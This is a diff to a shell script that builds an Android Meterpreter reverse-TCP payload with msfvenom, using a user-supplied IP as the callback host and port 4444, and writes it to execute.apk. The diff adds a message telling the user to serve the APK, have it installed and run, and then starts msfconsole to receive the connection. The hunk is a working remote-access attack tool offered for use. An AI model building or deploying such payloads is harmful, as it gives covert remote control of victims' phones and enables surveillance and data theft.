@@ -59,7 +59,9 @@ sudo rm -rf index.html
 sudo touch execute.apk
 read -p "enter ip-address" ip
 echo "your ip ->" $ip
+echo "Note - open your ip address wherever you want and install the apk file. Run it and enjoy"
 sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -o execute.apk
+msfconsole
 
 elif [ $x == 'Q' ]; then
 exit
